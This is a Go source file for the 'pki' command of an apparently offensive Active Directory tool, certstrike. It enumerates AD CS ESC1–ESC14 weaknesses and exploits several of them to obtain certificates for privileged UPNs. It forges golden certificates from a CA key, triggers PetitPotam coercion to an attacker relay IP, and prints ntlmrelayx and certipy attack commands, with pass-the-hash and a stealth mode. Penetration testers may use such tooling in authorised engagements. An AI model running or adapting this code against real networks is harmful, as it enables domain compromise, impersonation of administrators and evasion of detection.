package main

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"os"
	"strings"

	"github.com/loudmumble/certstrike/pkg/pki"
	"github.com/spf13/cobra"
)

var pkiCmd = &cobra.Command{
	Use:   "pki",
	Short: "Advanced Certificate/PKI attack toolkit",
	Long: `ADCS enumeration (ESC1-ESC14), golden certificate forging, ESC exploitation, PFX import, and engagement reporting.

Examples:
  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass
  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --ldaps
  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --json
  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --stealth
  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user --hash aad3b435b51404eeaad3b435b51404ee
  certstrike pki --exploit esc1 --template VulnTemplate --upn admin@corp.local --target-dc dc01.corp.local --domain corp.local -u user -p pass
  certstrike pki --exploit esc7 --ca CorpCA --upn admin@corp.local --target-dc dc01.corp.local --domain corp.local -u user -p pass
  certstrike pki --exploit esc8 --template Machine --target-dc dc01.corp.local --domain corp.local -u user -p pass --listener-ip 10.0.0.5
  certstrike pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt
  certstrike pki --report --format markdown --output findings.md --target-dc dc01.corp.local --domain corp.local -u user -p pass
  certstrike pki --cert-theft all
  certstrike pki --import-pfx cert.pfx`,
	RunE: func(cmd *cobra.Command, args []string) error {
		doEnum, _ := cmd.Flags().GetBool("enum")
		doForge, _ := cmd.Flags().GetBool("forge")
		exploit, _ := cmd.Flags().GetString("exploit")
		doAutoDetect, _ := cmd.Flags().GetBool("auto-detect")
		importPFX, _ := cmd.Flags().GetString("import-pfx")
		doReport, _ := cmd.Flags().GetBool("report")
		certTheft, _ := cmd.Flags().GetString("cert-theft")

		if !doEnum && !doForge && exploit == "" && !doAutoDetect && importPFX == "" && !doReport && certTheft == "" {
			return cmd.Help()
		}

		if certTheft != "" {
			pki.PrintCertTheftPlaybook(certTheft)
			return nil
		}
		if importPFX != "" {
			return runImportPFX(cmd, importPFX)
		}
		if doReport {
			return runReport(cmd)
		}
		if doAutoDetect {
			return runAutoDetect(cmd)
		}
		if exploit != "" {
			return runExploit(cmd, exploit)
		}
		if doEnum {
			return runEnumerate(cmd)
		}
		if doForge {
			return runForge(cmd)
		}
		return nil
	},
}

func buildADCSConfig(cmd *cobra.Command) *pki.ADCSConfig {
	targetDC, _ := cmd.Flags().GetString("target-dc")
	domain, _ := cmd.Flags().GetString("domain")
	username, _ := cmd.Flags().GetString("username")
	password, _ := cmd.Flags().GetString("password")
	hash, _ := cmd.Flags().GetString("hash")
	useTLS, _ := cmd.Flags().GetBool("ldaps")
	useStartTLS, _ := cmd.Flags().GetBool("start-tls")
	outputJSON, _ := cmd.Flags().GetBool("json")
	stealth, _ := cmd.Flags().GetBool("stealth")

	return &pki.ADCSConfig{
		TargetDC:    targetDC,
		Domain:      domain,
		Username:    username,
		Password:    password,
		Hash:        hash,
		UseTLS:      useTLS,
		UseStartTLS: useStartTLS,
		OutputJSON:  outputJSON,
		Stealth:     stealth,
	}
}

func runEnumerate(cmd *cobra.Command) error {
	cfg := buildADCSConfig(cmd)
	if cfg.TargetDC == "" || cfg.Domain == "" {
		return fmt.Errorf("--target-dc and --domain are required for enumeration")
	}
	if cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "") {
		return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or --hash <NT_HASH>)")
	}

	// JSON mode: use EnumerateAll for structured output
	if cfg.OutputJSON {
		result, err := pki.EnumerateAll(cfg)
		if err != nil {
			return fmt.Errorf("enumeration failed: %w", err)
		}
		data, err := json.MarshalIndent(result, "", "  ")
		if err != nil {
			return fmt.Errorf("marshal JSON: %w", err)
		}
		fmt.Println(string(data))
		return nil
	}

	templates, err := pki.EnumerateTemplates(cfg)
	if err != nil {
		return fmt.Errorf("enumeration failed: %w", err)
	}

	fmt.Printf("\n[+] Found %d certificate templates:\n\n", len(templates))
	for i, tmpl := range templates {
		vulns := "none"
		if len(tmpl.ESCVulns) > 0 {
			vulns = strings.Join(tmpl.ESCVulns, ", ")
		}
		fmt.Printf("  %d. %-30s  ESC: %-20s  Score: %d\n", i+1, tmpl.Name, vulns, tmpl.ESCScore)
		if tmpl.EnrolleeSuppliesSubject {
			fmt.Println("     ⚠  Enrollee Supplies Subject: YES")
		}
		if tmpl.AuthenticationEKU {
			fmt.Println("     ⚠  Authentication EKU: YES")
		}
		if !tmpl.RequiresManagerApproval {
			fmt.Println("     ⚠  Manager Approval: NO")
		}
		for _, f := range tmpl.ESC4Findings {
			fmt.Printf("     ⚠  ESC4: Trustee %s has %s (mask=0x%08x)\n", f.Trustee, strings.Join(f.Rights, ", "), f.AccessMask)
		}
	}

	// ESC5: CA object ACL inspection via nTSecurityDescriptor parsing
	fmt.Println("\n[*] Scanning CA objects for ESC5 (dangerous ACLs on CA itself)...")
	esc5Findings, err := pki.ScanESC5(cfg)
	if err != nil {
		fmt.Printf("[!] ESC5 scan failed: %v\n", err)
	} else if len(esc5Findings) == 0 {
		fmt.Println("[+] ESC5: No dangerous CA ACLs found.")
	} else {
		fmt.Printf("\n[!] ESC5 VULNERABLE — %d finding(s):\n\n", len(esc5Findings))
		for _, f := range esc5Findings {
			fmt.Printf("    CA:      %s\n", f.CAName)
			fmt.Printf("    DN:      %s\n", f.CADN)
			fmt.Printf("    Trustee: %s\n", f.Trustee)
			fmt.Printf("    Rights:  %s  (mask=0x%08x)\n", strings.Join(f.Rights, ", "), f.AccessMask)
			fmt.Println()
		}
	}

	// ESC8: NTLM relay to AD CS web enrollment
	fmt.Println("\n[*] Scanning for ESC8 (NTLM relay to web enrollment)...")
	esc8Findings, err := pki.ScanESC8(cfg)
	if err != nil {
		fmt.Printf("[!] ESC8 scan failed: %v\n", err)
	} else if len(esc8Findings) == 0 {
		fmt.Println("[+] ESC8: No vulnerable web enrollment endpoints found.")
	} else {
		fmt.Printf("\n[!] ESC8 VULNERABLE — %d finding(s):\n\n", len(esc8Findings))
		for _, f := range esc8Findings {
			fmt.Printf("    CA:        %s\n", f.CAName)
			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
			fmt.Printf("    Endpoint:  %s\n", f.HTTPEndpoint)
			fmt.Printf("    NTLM:      %v\n", f.NTLMEnabled)
			fmt.Printf("    Templates: %s\n", strings.Join(f.Templates, ", "))
			fmt.Printf("    Exploit:   ntlmrelayx.py -t %scertfnsh.asp -smb2support --adcs --template <TEMPLATE>\n", f.HTTPEndpoint)
			fmt.Println()
		}
	}

	// ESC11: NTLM relay to AD CS RPC interface
	fmt.Println("\n[*] Scanning for ESC11 (NTLM relay to RPC interface)...")
	esc11Findings, err := pki.ScanESC11(cfg)
	if err != nil {
		fmt.Printf("[!] ESC11 scan failed: %v\n", err)
	} else if len(esc11Findings) == 0 {
		fmt.Println("[+] ESC11: All CAs enforce RPC encryption.")
	} else {
		fmt.Printf("\n[!] ESC11 VULNERABLE — %d finding(s):\n\n", len(esc11Findings))
		for _, f := range esc11Findings {
			fmt.Printf("    CA:        %s\n", f.CAName)
			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
			fmt.Printf("    Flags:     0x%08x\n", f.Flags)
			fmt.Printf("    Encrypts:  %v\n", f.EnforcesEncryption)
			fmt.Printf("    Exploit:   ntlmrelayx.py -t rpc://%s -rpc-mode ICPR -icpr-ca-name %q -smb2support\n", f.CAHostname, f.CAName)
			fmt.Println()
		}
	}

	// ESC12: DCOM interface abuse on CA with network HSM key storage
	fmt.Println("\n[*] Scanning for ESC12 (DCOM interface abuse on CA)...")
	esc12Findings, err := pki.ScanESC12(cfg)
	if err != nil {
		fmt.Printf("[!] ESC12 scan failed: %v\n", err)
	} else if len(esc12Findings) == 0 {
		fmt.Println("[+] ESC12: No CAs with accessible DCOM endpoints found.")
	} else {
		fmt.Printf("\n[!] ESC12 VULNERABLE — %d finding(s):\n\n", len(esc12Findings))
		for _, f := range esc12Findings {
			fmt.Printf("    CA:        %s\n", f.CAName)
			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
			fmt.Printf("    DCOM:      %v\n", f.DCOMAccessible)
			fmt.Printf("    Flags:     0x%08x\n", f.Flags)
			fmt.Printf("    Exploit:   certstrike pki --exploit esc12 --template <TEMPLATE> --upn administrator@%s --target-dc %s --domain %s\n", cfg.Domain, cfg.TargetDC, cfg.Domain)
			fmt.Println()
		}
	}

	// ESC9: CT_FLAG_NO_SECURITY_EXTENSION — UPN spoofing via missing requester SID
	fmt.Println("\n[*] Scanning for ESC9 (CT_FLAG_NO_SECURITY_EXTENSION)...")
	esc9Findings, err := pki.ScanESC9(cfg)
	if err != nil {
		fmt.Printf("[!] ESC9 scan failed: %v\n", err)
	} else if len(esc9Findings) == 0 {
		fmt.Println("[+] ESC9: No vulnerable templates found.")
	} else {
		fmt.Printf("\n[!] ESC9 VULNERABLE — %d finding(s):\n\n", len(esc9Findings))
		for _, f := range esc9Findings {
			enforcement := "unknown"
			switch f.BindingEnforcement {
			case 0:
				enforcement = "Disabled (EXPLOITABLE)"
			case 1:
				enforcement = "Compatibility mode (EXPLOITABLE)"
			case 2:
				enforcement = "Full enforcement (mitigated)"
			}
			fmt.Printf("    Template:                %s\n", f.TemplateName)
			fmt.Printf("    NO_SECURITY_EXTENSION:   %v\n", f.HasNoSecurityExtension)
			fmt.Printf("    Authentication EKU:      %v\n", f.AuthenticationEKU)
			fmt.Printf("    Binding Enforcement:     %d (%s)\n", f.BindingEnforcement, enforcement)
			fmt.Println()
		}
	}

	// ESC10: Weak certificate mapping methods
	fmt.Println("\n[*] Scanning for ESC10 (weak certificate mapping methods)...")
	esc10Findings, err := pki.ScanESC10(cfg)
	if err != nil {
		fmt.Printf("[!] ESC10 scan failed: %v\n", err)
	} else if len(esc10Findings) == 0 {
		fmt.Println("[+] ESC10: Certificate mapping methods are not weak.")
	} else {
		fmt.Printf("\n[!] ESC10 VULNERABLE — %d finding(s):\n\n", len(esc10Findings))
		for _, f := range esc10Findings {
			enforcement := "unknown"
			switch f.BindingEnforcement {
			case 0:
				enforcement = "Disabled (EXPLOITABLE)"
			case 1:
				enforcement = "Compatibility mode (EXPLOITABLE)"
			case 2:
				enforcement = "Full enforcement (mitigated)"
			}
			fmt.Printf("    Mapping Methods:     0x%02x\n", f.MappingMethods)
			fmt.Printf("    UPN Mapping:         %v\n", f.UPNMappingEnabled)
			fmt.Printf("    S4U2Self Mapping:    %v\n", f.S4U2SelfEnabled)
			fmt.Printf("    Binding Enforcement: %d (%s)\n", f.BindingEnforcement, enforcement)
			fmt.Printf("    Vulnerable Templates (%d): %s\n", len(f.VulnerableTemplates), strings.Join(f.VulnerableTemplates, ", "))
			fmt.Println()
		}
	}

	// ESC13: OID group link abuse via msDS-OIDToGroupLink
	fmt.Println("\n[*] Scanning for ESC13 (OID group link abuse)...")
	esc13Findings, err := pki.ScanESC13(cfg)
	if err != nil {
		fmt.Printf("[!] ESC13 scan failed: %v\n", err)
	} else if len(esc13Findings) == 0 {
		fmt.Println("[+] ESC13: No linked issuance policy OIDs found.")
	} else {
		fmt.Printf("\n[!] ESC13 VULNERABLE — %d finding(s):\n\n", len(esc13Findings))
		for _, f := range esc13Findings {
			fmt.Printf("    Template:     %s\n", f.TemplateName)
			fmt.Printf("    Policy OID:   %s\n", f.IssuancePolicyOID)
			fmt.Printf("    Linked Group: %s (%s)\n", f.LinkedGroupName, f.LinkedGroup)
			fmt.Println()
		}
	}

	// ESC14: Weak explicit mappings via altSecurityIdentities
	fmt.Println("\n[*] Scanning for ESC14 (weak explicit mappings via altSecurityIdentities)...")
	esc14Findings, err := pki.ScanESC14(cfg)
	if err != nil {
		fmt.Printf("[!] ESC14 scan failed: %v\n", err)
	} else if len(esc14Findings) == 0 {
		fmt.Println("[+] ESC14: No schema v1 templates with weak mapping found.")
	} else {
		fmt.Printf("\n[!] ESC14 VULNERABLE — %d finding(s):\n\n", len(esc14Findings))
		for _, f := range esc14Findings {
			enforcement := "unknown"
			switch f.BindingEnforcement {
			case 0:
				enforcement = "Disabled (EXPLOITABLE)"
			case 1:
				enforcement = "Compatibility mode (EXPLOITABLE)"
			case 2:
				enforcement = "Full enforcement (mitigated)"
			}
			fmt.Printf("    Template:            %s\n", f.TemplateName)
			fmt.Printf("    Schema Version:      %d\n", f.SchemaVersion)
			fmt.Printf("    Explicit Mapping:    %v\n", f.AllowsExplicitMapping)
			fmt.Printf("    Strong Mapping Req:  %v\n", f.StrongMappingRequired)
			fmt.Printf("    Binding Enforcement: %d (%s)\n", f.BindingEnforcement, enforcement)
			fmt.Println()
		}
	}

	return nil
}

func runForge(cmd *cobra.Command) error {
	upn, _ := cmd.Flags().GetString("upn")
	caKeyPath, _ := cmd.Flags().GetString("ca-key")
	caCertPath, _ := cmd.Flags().GetString("ca-cert")
	output, _ := cmd.Flags().GetString("output")

	if upn == "" {
		return fmt.Errorf("--upn is required for certificate forging")
	}
	if output == "" {
		output = "forged-cert.pem"
	}

	// Strip .pem extension for base path if present
	basePath := strings.TrimSuffix(output, ".pem")
	basePath = strings.TrimSuffix(basePath, ".crt")

	// Golden Certificate mode: both --ca-key and --ca-cert provided
	// Uses ForgeGoldenCertificate to sign with real CA key and chain to real CA cert
	if caKeyPath != "" && caCertPath != "" {
		fmt.Println("[!] Golden Certificate mode: signing with real CA key + cert")
		caCert, caKey, err := pki.LoadCACertAndKey(caCertPath, caKeyPath)
		if err != nil {
			return fmt.Errorf("load CA material: %w", err)
		}

		cert, certKey, err := pki.ForgeGoldenCertificate(caKey, caCert, upn)
		if err != nil {
			return fmt.Errorf("forge golden certificate: %w", err)
		}

		if err := pki.WriteCertKeyPEM(cert, certKey, basePath); err != nil {
			return fmt.Errorf("write certificate: %w", err)
		}
		pfxPassword, _ := cmd.Flags().GetString("pfx-password")
		if err := pki.WritePFX(cert, certKey, basePath+".pfx", pfxPassword); err != nil {
			fmt.Printf("[!] PFX export failed: %v\n", err)
		}

		fmt.Printf("[+] Golden certificate (CA-signed) written to %s.crt / %s.pfx\n", basePath, basePath)
		fmt.Printf("    Subject: %s\n", cert.Subject.CommonName)
		fmt.Printf("    Issuer:  %s\n", cert.Issuer.CommonName)
		fmt.Printf("    UPN: %s\n", upn)
		fmt.Printf("    Serial: %s\n", cert.SerialNumber.Text(16))
		fmt.Printf("    Valid: %s to %s\n", cert.NotBefore.Format("2006-01-02"), cert.NotAfter.Format("2006-01-02"))
		return nil
	}

	// Self-signed mode: original ForgeCertificate behavior
	var caKey *ecdsa.PrivateKey

	if caKeyPath != "" {
		data, err := os.ReadFile(caKeyPath)
		if err != nil {
			return fmt.Errorf("read CA key: %w", err)
		}
		block, _ := pem.Decode(data)
		if block == nil {
			return fmt.Errorf("no PEM block found in %s", caKeyPath)
		}
		key, err := x509.ParseECPrivateKey(block.Bytes)
		if err != nil {
			pkcs8Key, err2 := x509.ParsePKCS8PrivateKey(block.Bytes)
			if err2 != nil {
				return fmt.Errorf("parse CA key: %w (also tried PKCS8: %v)", err, err2)
			}
			ecKey, ok := pkcs8Key.(*ecdsa.PrivateKey)
			if !ok {
				return fmt.Errorf("CA key is not ECDSA")
			}
			caKey = ecKey
		} else {
			caKey = key
		}
	} else {
		fmt.Println("[*] No --ca-key provided, generating ephemeral CA key...")
		var err error
		caKey, err = ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
		if err != nil {
			return fmt.Errorf("generate CA key: %w", err)
		}
	}

	cert, certKey, err := pki.ForgeCertificate(caKey, upn)
	if err != nil {
		return fmt.Errorf("forge certificate: %w", err)
	}

	if err := pki.WriteCertKeyPEM(cert, certKey, basePath); err != nil {
		return fmt.Errorf("write certificate: %w", err)
	}
	pfxPassword, _ := cmd.Flags().GetString("pfx-password")
	if err := pki.WritePFX(cert, certKey, basePath+".pfx", pfxPassword); err != nil {
		fmt.Printf("[!] PFX export failed: %v\n", err)
	}

	fmt.Printf("[+] Golden certificate written to %s.crt / %s.pfx\n", basePath, basePath)
	fmt.Printf("    Subject: %s\n", cert.Subject.CommonName)
	fmt.Printf("    UPN: %s\n", upn)
	fmt.Printf("    Serial: %s\n", cert.SerialNumber.String())
	fmt.Printf("    Valid: %s to %s\n", cert.NotBefore.Format("2006-01-02"), cert.NotAfter.Format("2006-01-02"))
	return nil
}

func runExploit(cmd *cobra.Command, exploit string) error {
	cfg := buildADCSConfig(cmd)
	if cfg.TargetDC == "" || cfg.Domain == "" {
		return fmt.Errorf("--target-dc and --domain are required")
	}

	templateName, _ := cmd.Flags().GetString("template")
	upn, _ := cmd.Flags().GetString("upn")
	output, _ := cmd.Flags().GetString("output")

	if templateName == "" {
		return fmt.Errorf("--template is required for exploitation")
	}
	if upn == "" {
		return fmt.Errorf("--upn is required for exploitation")
	}
	if output == "" {
		output = "exploited-cert.pem"
	}

	var cert *x509.Certificate
	var certKey *ecdsa.PrivateKey
	var err error

	switch strings.ToLower(exploit) {
	case "esc1":
		cert, certKey, err = pki.ExploitESC1(cfg, templateName, upn)
	case "esc2":
		cert, certKey, err = pki.ExploitESC2(cfg, templateName, upn)
	case "esc3":
		cert, certKey, err = pki.ExploitESC3(cfg, templateName, upn)
	case "esc4":
		cert, certKey, err = pki.ExploitESC4(cfg, templateName, upn)
	case "esc6":
		cert, certKey, err = pki.ExploitESC6(cfg, templateName, upn)
	case "esc7":
		caName, _ := cmd.Flags().GetString("ca")
		if caName == "" {
			return fmt.Errorf("--ca is required for ESC7 exploitation (target CA name)")
		}
		cert, certKey, err = pki.ExploitESC7(cfg, caName, upn)
	case "esc9":
		attackerDN, _ := cmd.Flags().GetString("attacker-dn")
		if attackerDN == "" {
			return fmt.Errorf("--attacker-dn is required for ESC9 exploitation (attacker's LDAP DN)")
		}
		cert, certKey, err = pki.ExploitESC9(cfg, templateName, attackerDN, upn)
	case "esc13":
		cert, certKey, err = pki.ExploitESC13(cfg, templateName, upn)
	case "esc8":
		// ESC8 is a relay attack — scan for the endpoint and print the ntlmrelayx command
		esc8Findings, scanErr := pki.ScanESC8(cfg)
		if scanErr != nil {
			return fmt.Errorf("ESC8 scan failed: %w", scanErr)
		}
		if len(esc8Findings) == 0 {
			return fmt.Errorf("no vulnerable web enrollment endpoints found")
		}
		fmt.Println("\n[!] ESC8 relay attack — use ntlmrelayx to relay coerced NTLM auth:")
		for _, f := range esc8Findings {
			fmt.Printf("\n    Target: %s (%s)\n", f.CAName, f.CAHostname)
			fmt.Printf("    ntlmrelayx.py -t %scertfnsh.asp -smb2support --adcs --template %s\n", f.HTTPEndpoint, templateName)
		}
		// If --listener-ip is set, trigger PetitPotam coercion automatically
		listenerIP, _ := cmd.Flags().GetString("listener-ip")
		if listenerIP != "" {
			fmt.Printf("\n[*] Triggering PetitPotam coercion: %s → %s\n", cfg.TargetDC, listenerIP)
			if coerceErr := pki.CoerceNTLMAuth(cfg.TargetDC, listenerIP, pki.CoercePetitPotam); coerceErr != nil {
				fmt.Printf("[!] PetitPotam coercion failed: %v\n", coerceErr)
				fmt.Printf("[*] Manual: PetitPotam.py %s %s\n", listenerIP, cfg.TargetDC)
			}
		} else {
			fmt.Printf("\n[*] To auto-trigger coercion, add: --listener-ip <YOUR_RELAY_IP>\n")
			fmt.Printf("[*] Or manually: PetitPotam.py <LISTENER_IP> %s\n", cfg.TargetDC)
		}
		fmt.Println("\n[*] After obtaining the certificate via relay:")
		fmt.Printf("    certipy auth -pfx <cert.pfx> -dc-ip %s\n", cfg.TargetDC)
		return nil
	case "esc12":
		// ESC12 is a DCOM-based attack — scan for accessible DCOM endpoints and print the relay command
		esc12Findings, scanErr := pki.ScanESC12(cfg)
		if scanErr != nil {
			return fmt.Errorf("ESC12 scan failed: %w", scanErr)
		}
		if len(esc12Findings) == 0 {
			return fmt.Errorf("no CAs with accessible DCOM endpoints found")
		}
		fmt.Println("\n[!] ESC12 DCOM relay attack — use ntlmrelayx to relay auth to ICertRequest DCOM interface:")
		for _, f := range esc12Findings {
			fmt.Printf("\n    Target: %s (%s)\n", f.CAName, f.CAHostname)
			fmt.Printf("    ntlmrelayx.py -t dcom://%s -dcom-mode ICPR -icpr-ca-name %q -smb2support --template %s\n",
				f.CAHostname, f.CAName, templateName)
			fmt.Printf("    # Then coerce auth: PetitPotam.py <LISTENER_IP> %s\n", cfg.TargetDC)
		}
		fmt.Println("\n[*] After obtaining the certificate via DCOM relay:")
		fmt.Printf("    certipy auth -pfx <cert.pfx> -dc-ip %s\n", cfg.TargetDC)
		return nil
	default:
		return fmt.Errorf("unsupported exploit: %s (supported: esc1, esc2, esc3, esc4, esc6, esc7, esc8, esc9, esc12, esc13)", exploit)
	}

	if err != nil {
		return fmt.Errorf("exploitation failed: %w", err)
	}

	pfxPassword, _ := cmd.Flags().GetString("pfx-password")
	basePath := strings.TrimSuffix(output, ".pem")
	basePath = strings.TrimSuffix(basePath, ".crt")

	// Always write PEM files
	if err := pki.WriteCertKeyPEM(cert, certKey, basePath); err != nil {
		return fmt.Errorf("write cert: %w", err)
	}
	// Also write PFX for direct certipy/Rubeus use
	pfxPath := basePath + ".pfx"
	if err := pki.WritePFX(cert, certKey, pfxPath, pfxPassword); err != nil {
		fmt.Printf("[!] PFX export failed: %v\n", err)
	}

	if cfg.OutputJSON {
		result := pki.ExploitResult{
			Exploit:   strings.ToUpper(exploit),
			Template:  templateName,
			TargetUPN: upn,
			CertPath:  basePath + ".crt",
			KeyPath:   basePath + ".key",
			PFXPath:   basePath + ".pfx",
			Success:   true,
		}
		data, err := json.MarshalIndent(result, "", "  ")
		if err != nil {
			return fmt.Errorf("marshal JSON: %w", err)
		}
		fmt.Println(string(data))
		return nil
	}

	fmt.Printf("\n[+] Exploitation successful!\n")
	fmt.Printf("    Exploit: %s\n", strings.ToUpper(exploit))
	fmt.Printf("    Template: %s\n", templateName)
	fmt.Printf("    UPN: %s\n", upn)
	fmt.Printf("    Output: %s.crt / %s.key / %s.pfx\n", basePath, basePath, basePath)
	return nil
}

func runAutoDetect(cmd *cobra.Command) error {
	cfg := buildADCSConfig(cmd)
	if cfg.TargetDC == "" || cfg.Domain == "" {
		return fmt.Errorf("--target-dc and --domain are required")
	}

	vulnerable, err := pki.AutoDetectESC(cfg)
	if err != nil {
		return fmt.Errorf("auto-detect: %w", err)
	}

	if len(vulnerable) == 0 {
		fmt.Println("[*] No vulnerable templates detected.")
		return nil
	}

	fmt.Printf("\n[+] Found %d vulnerable template(s) — prioritized attack paths:\n\n", len(vulnerable))
	for i, t := range vulnerable {
		fmt.Printf("  %d. [Score: %d] %s\n", i+1, t.ESCScore, t.Name)
		fmt.Printf("     Vulnerabilities: %s\n", strings.Join(t.ESCVulns, ", "))
		if t.EnrolleeSuppliesSubject {
			fmt.Println("     → Enrollee can supply subject (critical for impersonation)")
		}
		if t.AuthenticationEKU {
			fmt.Println("     → Has authentication EKU (can be used for domain auth)")
		}
		fmt.Println()
	}
	return nil
}

func runImportPFX(cmd *cobra.Command, pfxPath string) error {
	pfxPassword, _ := cmd.Flags().GetString("pfx-password")
	outputJSON, _ := cmd.Flags().GetBool("json")

	if outputJSON {
		info, err := pki.LoadPFXInfo(pfxPath, pfxPassword)
		if err != nil {
			return fmt.Errorf("load PFX: %w", err)
		}
		data, err := json.MarshalIndent(info, "", "  ")
		if err != nil {
			return fmt.Errorf("marshal JSON: %w", err)
		}
		fmt.Println(string(data))
		return nil
	}

	_, _, err := pki.LoadPFX(pfxPath, pfxPassword)
	if err != nil {
		return fmt.Errorf("load PFX: %w", err)
	}
	return nil
}

func runReport(cmd *cobra.Command) error {
	cfg := buildADCSConfig(cmd)
	if cfg.TargetDC == "" || cfg.Domain == "" {
		return fmt.Errorf("--target-dc and --domain are required for report generation")
	}

	reportFormat, _ := cmd.Flags().GetString("format")
	if reportFormat == "" {
		reportFormat = "markdown"
	}

	output, _ := cmd.Flags().GetString("output")
	if output == "" {
		output = "findings.md"
	}

	fmt.Printf("[*] Running full ADCS enumeration for report...\n")
	result, err := pki.EnumerateAll(cfg)
	if err != nil {
		return fmt.Errorf("enumeration failed: %w", err)
	}

	reportData, err := pki.GenerateReport(result, reportFormat)
	if err != nil {
		return fmt.Errorf("generate report: %w", err)
	}

	if err := os.WriteFile(output, reportData, 0600); err != nil {
		return fmt.Errorf("write report: %w", err)
	}

	fmt.Printf("[+] Report written to %s (%d bytes)\n", output, len(reportData))
	fmt.Printf("    Format:    %s\n", reportFormat)
	fmt.Printf("    Templates: %d\n", len(result.Templates))
	fmt.Printf("    Findings:  %d\n", result.VulnCount)
	return nil
}

func init() {
	rootCmd.AddCommand(pkiCmd)

	// Action flags
	pkiCmd.Flags().Bool("enum", false, "Enumerate ADCS certificate templates")
	pkiCmd.Flags().Bool("forge", false, "Forge a golden certificate")
	pkiCmd.Flags().String("exploit", "", "Exploit ESC vulnerability (esc1, esc2, esc3, esc4, esc6, esc7, esc8, esc9, esc12, esc13)")
	pkiCmd.Flags().Bool("auto-detect", false, "Auto-detect ESC vulnerabilities and prioritize attack paths")
	pkiCmd.Flags().String("import-pfx", "", "Import and display info from a PKCS12/PFX file")
	pkiCmd.Flags().Bool("report", false, "Generate engagement report from full ADCS enumeration")
	pkiCmd.Flags().String("cert-theft", "", "Display certificate theft playbook (theft1, theft2, theft3, theft4, theft5, all)")

	// Connection flags
	pkiCmd.Flags().String("target-dc", "", "Target domain controller hostname")
	pkiCmd.Flags().String("domain", "", "Active Directory domain name")
	pkiCmd.Flags().StringP("username", "u", "", "Domain username for LDAP authentication")
	pkiCmd.Flags().StringP("password", "p", "", "Domain password for LDAP authentication")
	pkiCmd.Flags().String("hash", "", "NTLM hash for pass-the-hash authentication")
	pkiCmd.Flags().Bool("ldaps", false, "Use LDAPS (port 636)")
	pkiCmd.Flags().Bool("start-tls", false, "Use StartTLS (upgrade plaintext LDAP to TLS)")

	// Certificate flags
	pkiCmd.Flags().String("upn", "", "User Principal Name for certificate forging")
	pkiCmd.Flags().String("ca-key", "", "Path to CA private key PEM file")
	pkiCmd.Flags().String("ca-cert", "", "Path to CA certificate PEM file (with --ca-key, enables golden certificate mode)")
	pkiCmd.Flags().String("template", "", "Certificate template name for exploitation")
	pkiCmd.Flags().String("pfx-password", "", "Password for PFX archive (default: empty/unencrypted)")
	pkiCmd.Flags().String("ca", "", "Target CA name for ESC7 exploitation")
	pkiCmd.Flags().String("attacker-dn", "", "Attacker's LDAP DN for ESC9 exploitation (e.g., CN=attacker,CN=Users,DC=corp,DC=local)")
	pkiCmd.Flags().String("listener-ip", "", "Attacker relay listener IP for ESC8/ESC11 (triggers PetitPotam coercion automatically)")

	// Output flags
	pkiCmd.Flags().StringP("output", "o", "", "Output file path")
	pkiCmd.Flags().Bool("json", false, "Output results as JSON instead of human-readable text")
	pkiCmd.Flags().String("format", "markdown", "Report format (markdown)")

	// Operational flags
	pkiCmd.Flags().Bool("stealth", false, "Enable stealth mode: random delays between queries, smaller page sizes")
}
